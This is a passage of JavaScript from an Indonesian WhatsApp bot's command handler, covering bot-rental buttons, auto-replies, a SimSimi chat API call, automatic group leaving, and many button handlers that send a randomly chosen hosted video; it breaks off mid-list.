case 'sewalonte':
case 'sewa':
  if(isZadani) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ⓄⓌⓃ`}, type: 1},
                                            {buttonId: `KODE QR`, buttonText: {displayText: `ⓆⓇ`}, type: 1}]      
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await ikyc.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: setQuoted, contextInfo: forward})                                 
                         break

default:
                                                      
if (isCmd && !multi && !isSimi || !isSimi && isCmd && multi && !iky.key.fromMe) {
if(autovn){ 
sendvn(gakada)
} else 
if(autosticker) {
const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']                   
const su = kta[Math.floor(Math.random() * kta.length)]
halo = fs.readFileSync(`${su}`)
ikyc.sendMessage(from, halo, sticker, {quoted: iky, contextInfo : forward})
} else if(typing){
ikyc.sendMessage(from, textcmd, text, {quoted : iky})
}
}
					
//Simi simi            
if(isGroup && isCmd && isSimi && !iky.key.fromMe){
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(sami) 
}

//Waktu sewa group      
if(isGroup && iky.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
await sendMess("Bye")
setTimeout( () => {
ikyc.groupLeave(from)
},4000)
}


	if (responseButton == 'chika') {
    var ini_chika = ['https://e.top4top.io/m_20449tcq71.mp4', 'https://c.top4top.io/m_204409rac1.mp4', 'https://d.top4top.io/m_2044grrvq1.mp4', 'https://a.top4top.io/m_20447gp2m1.mp4', 'https://b.top4top.io/m_2044tms6o1.mp4', 'https://l.top4top.io/m_2044bpcnz1.mp4', 'https://k.top4top.io/m_2044djvwa1.mp4', 'https://i.top4top.io/m_2044edr6b1.mp4', 'https://j.top4top.io/m_20440trai1.mp4', 'https://h.top4top.io/m_20444e0od1.mp4', 'https://f.top4top.io/m_2044sd4yj1.mp4', 'https://g.top4top.io/m_2044pbyik1.mp4', 'https://e.top4top.io/m_2044plq2c1.mp4', 'https://c.top4top.io/m_20444gxgc1.mp4', 'https://d.top4top.io/m_2044huvjs1.mp4', 'https://k.top4top.io/m_2044jizu61.mp4', 'https://l.top4top.io/m_2044tz4ks1.mp4', 'https://a.top4top.io/m_2044jn6161.mp4', 'https://h.top4top.io/m_2044gcixv1.mp4', 'https://g.top4top.io/m_20444c9161.mp4', 'https://j.top4top.io/m_2044ptrlc1.mp4', 'https://i.top4top.io/m_2044pwj221.mp4', 'https://f.top4top.io/m_2044wk7cs1.mp4', 'https://e.top4top.io/m_2044z3oq91.mp4', 'https://d.top4top.io/m_2044pzqsv1.mp4'];
    var random_chika = ini_chika[Math.floor(Math.random() * (ini_chika.length))];
    let buff = await getBuffer(random_chika);
    ikyc.sendMessage(from, buff, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'delvira') {
    setReply(mess.wait);
    var delvira = ['https://h.top4top.io/m_2045q48rg1.mp4', 'https://i.top4top.io/m_204581d7k1.mp4', 'https://j.top4top.io/m_2045uhkes1.mp4', 'https://g.top4top.io/m_2045l52is1.mp4', 'https://i.top4top.io/m_2045ai8cb1.mp4', 'https://d.top4top.io/m_2045u59ck1.mp4', 'https://f.top4top.io/m_204582jv91.mp4', 'https://e.top4top.io/m_2045l4uit1.mp4', 'https://g.top4top.io/m_20450f0kl1.mp4', 'https://a.top4top.io/m_2045pd6r01.mp4', 'https://c.top4top.io/m_2045g84yn1.mp4', 'https://h.top4top.io/m_2045t100r1.mp4', 'https://j.top4top.io/m_2045en2j01.mp4', 'https://b.top4top.io/m_2045upgh01.mp4', 'https://l.top4top.io/m_2045pu58m1.mp4', 'https://k.top4top.io/m_2045i29cg1.mp4', 'https://e.top4top.io/m_2045q6mkm1.mp4', 'https://f.top4top.io/m_2045jl1jg1.mp4', 'https://c.top4top.io/m_20450bu4q1.mp4', 'https://d.top4top.io/m_2045wojl61.mp4'];
    var random_delvira = delvira[Math.floor(Math.random() * (delvira.length))];
    let ini_delvira = await getBuffer(random_delvira);
    ikyc.sendMessage(from, ini_delvira, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'ayu') {
    setReply(mess.wait);
    var ayu = ['https://h.top4top.io/m_2045353te1.mp4', 'https://i.top4top.io/m_2045uveyv1.mp4', 'https://g.top4top.io/m_2045mt9ww1.mp4', 'https://f.top4top.io/m_20450uurm1.mp4', 'https://c.top4top.io/m_2045qmp741.mp4', 'https://e.top4top.io/m_20452j1l01.mp4', 'https://b.top4top.io/m_2045k8f751.mp4', 'https://a.top4top.io/m_2045eg2jp1.mp4', 'https://d.top4top.io/m_2045jcjsl1.mp4', 'https://h.top4top.io/m_2045tjyl81.mp4', 'https://j.top4top.io/m_204595j5b1.mp4', 'https://d.top4top.io/m_2045crady1.mp4', 'https://g.top4top.io/m_20457ii1t1.mp4', 'https://k.top4top.io/m_2045zmfgu1.mp4', 'https://b.top4top.io/m_204514isy1.mp4', 'https://e.top4top.io/m_2045ryncv1.mp4', 'https://f.top4top.io/m_20456rgqd1.mp4', 'https://i.top4top.io/m_2045ie5dw1.mp4', 'https://l.top4top.io/m_2045o7w9v1.mp4', 'https://c.top4top.io/m_2045hcjnm1.mp4'];
    var random_ayu = ayu[Math.floor(Math.random() * (ayu.length))];
    let ini = await getBuffer(random_ayu);
    ikyc.sendMessage(from, ini, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'bunga') {
    setReply(mess.wait);
    var bunga = ['https://d.top4top.io/m_2045ln0hy1.mp4', 'https://b.top4top.io/m_2045wt4lb1.mp4', 'https://a.top4top.io/m_2045s3khl1.mp4', 'https://f.top4top.io/m_2045jb2va1.mp4', 'https://l.top4top.io/m_2045c7vqm1.mp4', 'https://k.top4top.io/m_20459shmj1.mp4', 'https://b.top4top.io/m_2045v82yo1.mp4', 'https://h.top4top.io/m_20458jkj91.mp4', 'https://f.top4top.io/m_2045becu81.mp4', 'https://i.top4top.io/m_204546wbm1.mp4', 'https://e.top4top.io/m_20455p1.mp4', 'https://i.top4top.io/m_204573y8p1.mp4', 'https://h.top4top.io/m_204519hat1.mp4', 'https://k.top4top.io/m_204502t021.mp4', 'https://l.top4top.io/m_2045ex4p81.mp4', 'https://g.top4top.io/m_2045f693d1.mp4', 'https://j.top4top.io/m_2045ypbga1.mp4', 'https://d.top4top.io/m_2045kzqx61.mp4', 'https://j.top4top.io/m_2045ltjq51.mp4', 'https://c.top4top.io/m_20456e8wc1.mp4', 'https://c.top4top.io/m_2045oggyg1.mp4', 'https://g.top4top.io/m_204545km11.mp4', 'https://e.top4top.io/m_2045mbr0w1.mp4'];
    var random_bunga = bunga[Math.floor(Math.random() * (bunga.length))];
    let ini_bunga = await getBuffer(random_bunga);
    ikyc.sendMessage(from, ini_bunga, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'aura') {
    setReply(mess.wait);
    var aura = ['https://g.top4top.io/m_2045kg02x1.mp4', 'https://f.top4top.io/m_2045bzzv61.mp4', 'https://e.top4top.io/m_2045u39bp1.mp4', 'https://c.top4top.io/m_2045nz5y81.mp4', 'https://b.top4top.io/m_2045bd5nx1.mp4', 'https://d.top4top.io/m_2045falge1.mp4', 'https://a.top4top.io/m_2045eljtw1.mp4', 'https://l.top4top.io/m_2045kcp201.mp4', 'https://j.top4top.io/m_2045at6161.mp4', 'https://i.top4top.io/m_2045nmmpu1.mp4', 'https://k.top4top.io/m_2045zox271.mp4', 'https://h.top4top.io/m_2045qzh0s1.mp4', 'https://g.top4top.io/m_2045bg23m1.mp4', 'https://e.top4top.io/m_20456vum81.mp4', 'https://c.top4top.io/m_2045vew941.mp4', 'https://d.top4top.io/m_20450ihor1.mp4', 'https://f.top4top.io/m_2045qyei51.mp4', 'https://b.top4top.io/m_2045pn2wh1.mp4', 'https://k.top4top.io/m_20457x5tn1.mp4', 'https://a.top4top.io/m_2045vc1vm1.mp4', 'https://l.top4top.io/m_2045bqxm91.mp4'];
    var random_aura = aura[Math.floor(Math.random() * (aura.length))];
    let ini_aura = await getBuffer(random_aura);
    ikyc.sendMessage(from, ini_aura, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'nisa') {
    setReply(mess.wait);
    var nisa = ['https://i.top4top.io/m_2045a62xr1.mp4', 'https://f.top4top.io/m_2045ag1ah1.mp4', 'https://h.top4top.io/m_2045aao0z1.mp4', 'https://g.top4top.io/m_20452ycpb1.mp4', 'https://d.top4top.io/m_2045w6bhe1.mp4', 'https://e.top4top.io/m_2045xra1y1.mp4', 'https://l.top4top.io/m_2045t75ik1.mp4', 'https://c.top4top.io/m_2045tekbe1.mp4', 'https://b.top4top.io/m_20452iret1.mp4', 'https://a.top4top.io/m_2045mx50v1.mp4', 'https://j.top4top.io/m_2045p4i5g1.mp4', 'https://k.top4top.io/m_2045ka8zl1.mp4', 'https://i.top4top.io/m_2045ugp6n1.mp4', 'https://f.top4top.io/m_20452avj31.mp4', 'https://e.top4top.io/m_2045nb03l1.mp4', 'https://g.top4top.io/m_2045x4itm1.mp4', 'https://c.top4top.io/m_2045riu151.mp4', 'https://d.top4top.io/m_2045fz1ic1.mp4', 'https://l.top4top.io/m_2045i393z1.mp4', 'https://b.top4top.io/m_2045ws5mp1.mp4', 'https://k.top4top.io/m_20459e8w41.mp4', 'https://j.top4top.io/m_204558yj01.mp4', 'https://a.top4top.io/m_20457ksoh1.mp4', 'https://i.top4top.io/m_2045dk4sl1.mp4'];
    var random_nisa = nisa[Math.floor(Math.random() * (nisa.length))];
    let ini_nisa = await getBuffer(random_nisa);
    ikyc.sendMessage(from, ini_nisa, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'ziva') {
    setReply(mess.wait);
    var ziva = ['https://a.top4top.io/m_2045w0s1a1.mp4', 'https://d.top4top.io/m_2045xs8yi1.mp4', 'https://b.top4top.io/m_2045azqmo1.mp4', 'https://f.top4top.io/m_2045two7u1.mp4', 'https://c.top4top.io/m_2045qyybj1.mp4', 'https://e.top4top.io/m_20451udwa1.mp4', 'https://g.top4top.io/m_2045wf56i1.mp4', 'https://j.top4top.io/m_2045eygb01.mp4', 'https://l.top4top.io/m_2045wc7px1.mp4', 'https://c.top4top.io/m_2045w1vo91.mp4', 'https://d.top4top.io/m_20456rh231.mp4', 'https://l.top4top.io/m_2045alof61.mp4', 'https://h.top4top.io/m_2045r85wl1.mp4', 'https://e.top4top.io/m_20451kltw1.mp4', 'https://g.top4top.io/m_20459k8ps1.mp4', 'https://f.top4top.io/m_2045ldcsq1.mp4', 'https://f.top4top.io/m_2045hvozl1.mp4', 'https://c.top4top.io/m_20452p34z1.mp4', 'https://l.top4top.io/m_2045msq4m1.mp4', 'https://i.top4top.io/m_20457dpjf1.mp4', 'https://k.top4top.io/m_2045252vc1.mp4', 'https://h.top4top.io/m_2045hmckz1.mp4', 'https://a.top4top.io/m_20457d0zk1.mp4', 'https://i.top4top.io/m_2045x1txz1.mp4', 'https://g.top4top.io/m_2045vh0di1.mp4', 'https://g.top4top.io/m_2045yl2it1.mp4', 'https://d.top4top.io/m_20456hnro1.mp4', 'https://k.top4top.io/m_20452q7ko1.mp4', 'https://k.top4top.io/m_20456hkh61.mp4', 'https://a.top4top.io/m_2045ytjc41.mp4', 'https://h.top4top.io/m_2045iwljm1.mp4', 'https://e.top4top.io/m_2045cuwm51.mp4', 'https://i.top4top.io/m_2045d43m11.mp4', 'https://b.top4top.io/m_2045qlcbo1.mp4', 'https://j.top4top.io/m_2045ym82h1.mp4', 'https://j.top4top.io/m_2045bew1l1.mp4', 'https://b.top4top.io/m_2045ythaz1.mp4'];
    var random_ziva = ziva[Math.floor(Math.random() * (ziva.length))];
    let ini_ziva = await getBuffer(random_ziva);
    ikyc.sendMessage(from, ini_ziva, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'yana') {
    setReply(mess.wait);
    var yana = ['https://g.top4top.io/m_2045p55sm1.mp4', 'https://f.top4top.io/m_2045o2z231.mp4', 'https://h.top4top.io/m_2045na6v81.mp4', 'https://i.top4top.io/m_2045cdyjt1.mp4', 'https://c.top4top.io/m_2045ro9xo1.mp4', 'https://b.top4top.io/m_2045edz2q1.mp4', 'https://a.top4top.io/m_2045ybdlt1.mp4', 'https://i.top4top.io/m_2045kk4t61.mp4', 'https://d.top4top.io/m_2045ehl6b1.mp4', 'https://k.top4top.io/m_20454zh0e1.mp4', 'https://l.top4top.io/m_2045y6bfe1.mp4', 'https://j.top4top.io/m_2045wxx3t1.mp4', 'https://h.top4top.io/m_2045cyk6a1.mp4', 'https://g.top4top.io/m_2045buha21.mp4', 'https://c.top4top.io/m_2045jzgsn1.mp4', 'https://e.top4top.io/m_2045dd9x11.mp4', 'https://d.top4top.io/m_2045dg6hl1.mp4', 'https://b.top4top.io/m_2045zmtsq1.mp4', 'https://f.top4top.io/m_2045m94wa1.mp4', 'https://a.top4top.io/m_2045d8rwp1.mp4', 'https://l.top4top.io/m_2045l80391.mp4', 'https://k.top4top.io/m_20458j0dc1.mp4', 'https://j.top4top.io/m_2045hh4741.mp4', 'https://i.top4top.io/m_2045xk4x71.mp4'];
    var random_yana = yana[Math.floor(Math.random() * (yana.length))];
    let ini_yana = await getBuffer(random_yana);
    ikyc.sendMessage(from, ini_yana, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'viona') {
    setReply(mess.wait);
    var viona = ['https://h.top4top.io/m_2045fs1b71.mp4', 'https://g.top4top.io/m_20453m4y71.mp4', 'https://g.top4top.io/m_2045mgrc01.mp4', 'https://f.top4top.io/m_2045p29p01.mp4', 'https://l.top4top.io/m_2045ity101.mp4', 'https://i.top4top.io/m_2045kguyy1.mp4', 'https://a.top4top.io/m_204549ynr1.mp4', 'https://b.top4top.io/m_2045y0fty1.mp4', 'https://c.top4top.io/m_20456si0m1.mp4', 'https://f.top4top.io/m_20457pmms1.mp4', 'https://h.top4top.io/m_2045gtquo1.mp4', 'https://j.top4top.io/m_204568o961.mp4', 'https://a.top4top.io/m_2045jqw861.mp4', 'https://d.top4top.io/m_2045frb0x1.mp4', 'https://c.top4top.io/m_2045xzr2v1.mp4', 'https://b.top4top.io/m_2045ae34n1.mp4', 'https://h.top4top.io/m_20453a5r81.mp4', 'https://k.top4top.io/m_2045baiy41.mp4', 'https://g.top4top.io/m_2045fjj6h1.mp4', 'https://i.top4top.io/m_2045q3tba1.mp4', 'https://d.top4top.io/m_2045npd2v1.mp4', 'https://e.top4top.io/m_2045fw9tg1.mp4', 'https://e.top4top.io/m_2045g0bgt1.mp4', 'https://k.top4top.io/m_2045opgb71.mp4'];
    var random_viona = viona[Math.floor(Math.random() * (viona.length))];
    let ini_viona = await getBuffer(random_viona);
    ikyc.sendMessage(from, ini_viona, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'syania') {
    setReply(mess.wait);
    var syania = ['https://f.top4top.io/m_2045x5wnd1.mp4', 'https://e.top4top.io/m_2045zv8zg1.mp4', 'https://d.top4top.io/m_2045trg5i1.mp4', 'https://c.top4top.io/m_2045xbfb51.mp4', 'https://h.top4top.io/m_2045dblc31.mp4', 'https://a.top4top.io/m_2045xd5sx1.mp4', 'https://k.top4top.io/m_2045520uv1.mp4', 'https://j.top4top.io/m_2045bplb41.mp4', 'https://i.top4top.io/m_2045x91991.mp4', 'https://l.top4top.io/m_2045jr6gs1.mp4', 'https://g.top4top.io/m_2045i9xs01.mp4', 'https://e.top4top.io/m_2045ideve1.mp4', 'https://f.top4top.io/m_2045g992t1.mp4', 'https://d.top4top.io/m_2045m180v1.mp4', 'https://c.top4top.io/m_2045n6bm31.mp4', 'https://b.top4top.io/m_2045s5r3z1.mp4', 'https://i.top4top.io/m_2045xoitc1.mp4', 'https://k.top4top.io/m_2045dur3t1.mp4', 'https://d.top4top.io/m_2045c6ddy1.mp4', 'https://j.top4top.io/m_2045nbbuc1.mp4', 'https://g.top4top.io/m_2045yinwy1.mp4', 'https://a.top4top.io/m_2045qsqhq1.mp4', 'https://c.top4top.io/m_20453tu1v1.mp4', 'https://e.top4top.io/m_2045zjbk31.mp4', 'https://f.top4top.io/m_2045n4rmz1.mp4', 'https://h.top4top.io/m_2045reqfb1.mp4', 'https://a.top4top.io/m_2045i86q21.mp4', 'https://b.top4top.io/m_20453xada1.mp4'];
    var random_syania = syania[Math.floor(Math.random() * (syania.length))];
    let ini_syania = await getBuffer(random_syania);
    ikyc.sendMessage(from, ini_syania, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'riri') {
    setReply(mess.wait);
    var riri = ['https://e.top4top.io/m_2045ut0en1.mp4', 'https://d.top4top.io/m_2045a5q5l1.mp4', 'https://f.top4top.io/m_2045rd0z31.mp4', 'https://c.top4top.io/m_2045zm4xy1.mp4', 'https://b.top4top.io/m_2045n6guq1.mp4', 'https://l.top4top.io/m_2045v8ck61.mp4', 'https://a.top4top.io/m_2045jbwwh1.mp4', 'https://k.top4top.io/m_2045ndl5m1.mp4', 'https://j.top4top.io/m_20457v6t61.mp4', 'https://i.top4top.io/m_2045a3gre1.mp4', 'https://h.top4top.io/m_2045tli2k1.mp4', 'https://g.top4top.io/m_2045z1u2g1.mp4', 'https://f.top4top.io/m_2045kdv2f1.mp4', 'https://e.top4top.io/m_20458qzhw1.mp4', 'https://d.top4top.io/m_20459vq7t1.mp4', 'https://c.top4top.io/m_20452b3av1.mp4', 'https://b.top4top.io/m_2045u5z3p1.mp4', 'https://a.top4top.io/m_2045l6nrb1.mp4'];
    var random_riri = riri[Math.floor(Math.random() * (riri.length))];
    let ini_riri = await getBuffer(random_riri);
    ikyc.sendMessage(from, ini_riri, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'syifa') {
    setReply(mess.wait);
    var syifa = ['https://h.top4top.io/m_2044bbyhm1.mp4', 'https://l.top4top.io/m_2044xa3nk1.mp4', 'https://j.top4top.io/m_20446ggxu1.mp4', 'https://d.top4top.io/m_2044rvctf1.mp4', 'https://b.top4top.io/m_2044kdgfw1.mp4', 'https://k.top4top.io/m_204432xwq1.mp4', 'https://c.top4top.io/m_204456vl01.mp4', 'https://a.top4top.io/m_2044bz2nv1.mp4', 'https://i.top4top.io/m_20440vzg41.mp4', 'https://e.top4top.io/m_20446qugg1.mp4', 'https://g.top4top.io/m_2044xrism1.mp4', 'https://c.top4top.io/m_20449iqt51.mp4', 'https://a.top4top.io/m_2044h64w01.mp4', 'https://d.top4top.io/m_20445mytg1.mp4', 'https://g.top4top.io/m_20445g4ue1.mp4', 'https://i.top4top.io/m_2044l1yk41.mp4', 'https://c.top4top.io/m_2044vpzyb1.mp4', 'https://e.top4top.io/m_20445z0xd1.mp4', 'https://d.top4top.io/m_2044qjas41.mp4', 'https://b.top4top.io/m_2044irvk41.mp4', 'https://l.top4top.io/m_2044wmw5d1.mp4', 'https://k.top4top.io/m_2044jewbq1.mp4', 'https://j.top4top.io/m_2044lo9sv1.mp4', 'https://i.top4top.io/m_2044fq2ne1.mp4', 'https://h.top4top.io/m_2044wudwv1.mp4', 'https://f.top4top.io/m_20445frga1.mp4'];
    var random_syifa = syifa[Math.floor(Math.random() * (syifa.length))];
    let ini_syifa = await getBuffer(random_syifa);
    ikyc.sendMessage(from, ini_syifa, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'mama_gina') {
    setReply(mess.wait);
    var mama_gina = ['https://j.top4top.io/m_2044moqoh1.mp4', 'https://a.top4top.io/m_2044kfu031.mp4', 'https://e.top4top.io/m_2044pd4q61.mp4', 'https://b.top4top.io/m_2044hd3hd1.mp4', 'https://k.top4top.io/m_2044lw3oq1.mp4', 'https://g.top4top.io/m_2044iu82p1.mp4', 'https://g.top4top.io/m_2044b4orc1.mp4', 'https://c.top4top.io/m_2044no8dz1.mp4', 'https://i.top4top.io/m_2044pxagw1.mp4', 'https://b.top4top.io/m_2044z2w4t1.mp4', 'https://c.top4top.io/m_2044lcxpj1.mp4', 'https://d.top4top.io/m_2044nvuaw1.mp4', 'https://f.top4top.io/m_20440g0o31.mp4', 'https://k.top4top.io/m_2044v2ime1.mp4', 'https://h.top4top.io/m_2044awwxm1.mp4', 'https://d.top4top.io/m_2044ht3vj1.mp4', 'https://l.top4top.io/m_2044bw2d31.mp4', 'https://i.top4top.io/m_2044zuzja1.mp4', 'https://l.top4top.io/m_2044cogw61.mp4', 'https://h.top4top.io/m_2044jasn31.mp4', 'https://j.top4top.io/m_204473eed1.mp4', 'https://a.top4top.io/m_20445wkpp1.mp4'];
    var random_mama_gina = mama_gina[Math.floor(Math.random() * (mama_gina.length))];
    let ini_mama_gina = await getBuffer(random_mama_gina);
    ikyc.sendMessage(from, ini_mama_gina, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'alcakenya') {
    setReply(mess.wait);
    var alcakenya = ['https://l.top4top.io/m_2044ehtwa1.mp4', 'https://k.top4top.io/m_2044h7tpc1.mp4', 'https://b.top4top.io/m_2044l37zk1.mp4', 'https://i.top4top.io/m_2044e9pqz1.mp4', 'https://j.top4top.io/m_2044obe8d1.mp4', 'https://k.top4top.io/m_2044dh7u21.mp4', 'https://c.top4top.io/m_2044o3ohe1.mp4', 'https://f.top4top.io/m_2044zm90s1.mp4', 'https://d.top4top.io/m_2044v7mo21.mp4', 'https://h.top4top.io/m_20446er9r1.mp4', 'https://g.top4top.io/m_2044o8u9t1.mp4', 'https://a.top4top.io/m_204421sn31.mp4', 'https://b.top4top.io/m_2044khyds1.mp4', 'https://a.top4top.io/m_2044vga111.mp4', 'https://l.top4top.io/m_2044mp7841.mp4', 'https://c.top4top.io/m_2044m3h8m1.mp4', 'https://f.top4top.io/m_2044ek3vd1.mp4', 'https://e.top4top.io/m_20443r9am1.mp4', 'https://d.top4top.io/m_2044g19oc1.mp4', 'https://j.top4top.io/m_20440tis11.mp4', 'https://e.top4top.io/m_2044yimnr1.mp4'];
    var random_alcakenya = alcakenya[Math.floor(Math.random() * (alcakenya.length))];
    let ini_alcakenya = await getBuffer(random_alcakenya);
    ikyc.sendMessage(from, ini_alcakenya, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'mangayutri') {
    setReply(mess.wait);
    var mangayutri = ['https://e.top4top.io/m_2044wm1kq1.mp4', 'https://l.top4top.io/m_2044k0psz1.mp4', 'https://c.top4top.io/m_2044y394z1.mp4', 'https://a.top4top.io/m_2044mzst31.mp4', 'https://g.top4top.io/m_2044tq6o11.mp4', 'https://f.top4top.io/m_2044z61tt1.mp4', 'https://d.top4top.io/m_2044t3dn91.mp4', 'https://k.top4top.io/m_20443i8ba1.mp4', 'https://b.top4top.io/m_2044i0ao91.mp4', 'https://l.top4top.io/m_2044dvyeb1.mp4', 'https://h.top4top.io/m_2044d5gey1.mp4', 'https://f.top4top.io/m_204484esr1.mp4', 'https://i.top4top.io/m_2044ez7y91.mp4', 'https://c.top4top.io/m_2044qkb5k1.mp4', 'https://j.top4top.io/m_2044wwdfy1.mp4', 'https://d.top4top.io/m_2044fzmw21.mp4', 'https://g.top4top.io/m_20444rprh1.mp4', 'https://e.top4top.io/m_20446919h1.mp4', 'https://a.top4top.io/m_2044unrp01.mp4', 'https://i.top4top.io/m_20441xktm1.mp4', 'https://h.top4top.io/m_20444t5dj1.mp4', 'https://f.top4top.io/m_2044l4j3r1.mp4', 'https://k.top4top.io/m_2044wb7pq1.mp4', 'https://e.top4top.io/m_2044i5rki1.mp4', 'https://j.top4top.io/m_2044s58ir1.mp4', 'https://g.top4top.io/m_2044dayid1.mp4', 'https://d.top4top.io/m_204492t8n1.mp4'];
    var random_mangayutri = mangayutri[Math.floor(Math.random() * (mangayutri.length))];
    let ini_mangayutri = await getBuffer(random_mangayutri);
    ikyc.sendMessage(from, ini_mangayutri, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'rikagusriani') {
    setReply(mess.wait);
    var rikagusriani = ['https://b.top4top.io/m_1930thxw90.mp4', 'https://d.top4top.io/m_1930pezhp0.mp4', 'https://c.top4top.io/m_1930cjgbx0.mp4', 'https://b.top4top.io/m_1930v6vhg0.mp4', 'https://f.top4top.io/m_1930uh7ud0.mp4', 'https://a.top4top.io/m_1930c9cpb0.mp4', 'https://k.top4top.io/m_19308amkf0.mp4', 'https://d.top4top.io/m_1930wjaq60.mp4', 'https://i.top4top.io/m_1930n2um40.mp4', 'https://i.top4top.io/m_1930e14pi0.mp4', 'https://i.top4top.io/m_1930w6lwf0.mp4', 'https://e.top4top.io/m_19307autl0.mp4', 'https://d.top4top.io/m_1930i6tfc0.mp4', 'https://c.top4top.io/m_1930qmr7u0.mp4', 'https://d.top4top.io/m_1930itbte1.mp4', 'https://i.top4top.io/m_1930ze4oq0.mp4', 'https://j.top4top.io/m_1930kkqyh1.mp4', 'https://f.top4top.io/m_1930zevlz0.mp4', 'https://g.top4top.io/m_1930q0apu1.mp4', 'https://h.top4top.io/m_1930trfsv2.mp4'];
    var random_rikagusriani = rikagusriani[Math.floor(Math.random() * (rikagusriani.length))];
    let ini_rikagusriani = await getBuffer(random_rikagusriani);
    ikyc.sendMessage(from, ini_rikagusriani, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'asupan') {
    setReply(mess.wait);
    var asupannih = ['http://sansekai.my.id/ptl_repost/120416207_674661289840975_7238538460676645249_n.mp4', 'http://sansekai.my.id/ptl_repost/120443017_225738842307010_1507614018538871668_n.mp4', 'http://sansekai.my.id/ptl_repost/120506710_129730895516659_9090102890235113922_n.mp4', 'http://sansekai.my.id/ptl_repost/120518115_3382156938497131_2702539154432231938_n.mp4', 'http://sansekai.my.id/ptl_repost/120533450_988960268238482_4908300175960396265_n.mp4', 'http://sansekai.my.id/ptl_repost/120554993_913582535835353_7937155730001219945_n.mp4', 'http://sansekai.my.id/ptl_repost/120565745_258483202099028_1831534734126408497_n.mp4', 'http://sansekai.my.id/ptl_repost/120570166_2716242608644571_5562452335611050430_n.mp4', 'http://sansekai.my.id/ptl_repost/120571358_3743879342322868_4731152347084614368_n.mp4', 'http://sansekai.my.id/ptl_repost/120571938_198275171805822_8506241533969509004_n.mp4', 'http://sansekai.my.id/ptl_repost/120573034_128654721967389_1837144340570017830_n.mp4', 'http://sansekai.my.id/ptl_repost/120574217_2707319792866165_3682328392840010261_n.mp4', 